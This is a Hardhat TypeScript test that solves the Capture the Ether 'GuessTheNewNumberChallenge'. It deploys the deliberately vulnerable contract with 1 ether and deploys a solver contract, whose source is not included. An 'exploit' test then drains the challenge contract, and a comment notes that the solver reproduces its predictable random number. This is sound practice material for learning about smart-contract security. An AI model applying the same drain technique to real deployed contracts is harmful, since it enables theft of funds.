import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let solver: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);

    solver = await (
      await ethers.getContractFactory('solver', attacker)
    ).deploy(target.address);

    await solver.deployed();
  });

  it('exploit', async () => {

    //calling contract to send same variable as the random number

    const tx = await solver.solve({
      value: utils.parseEther('1'),
    });

    await tx.wait();

    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});